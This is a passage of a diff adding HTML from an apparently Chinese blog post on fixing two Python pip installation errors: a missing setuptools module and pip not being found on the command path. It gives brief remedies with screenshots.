+<p>若安装过程中出现”No module named setuptools”这个错误,则需要单独再去下载一个setuptools<br><code>https://pypi.python.org/pypi/setuptools</code><br>下载后解压到和python同目录下，cd进入，用python setup.py install安装<br><img src="http://i2.51cto.com/images/blog/201801/29/beb89cf9a7abea06fc7e14ebb563de5d.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>完成后再回到前面，重复一遍就行了</p>
+<hr>
+<p>若出现”‘pip’ 不是内部或外部命令，也不是可运行的程序<br>或批处理文件。”<br><img src="http://i2.51cto.com/images/blog/201801/31/619a45b1675218c92912ee82f798b828.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>只需要将Python目录下的Scripts添加进环境变量里就OK了<br><img src="http://i2.51cto.com/images/blog/201801/31/1c220edc5fbfd3512fa41d36e71d34b6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="http://i2.51cto.com/images/blog/201801/31/6abf02a787011e5363a4a5a757170a85.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
     </div>
 
       
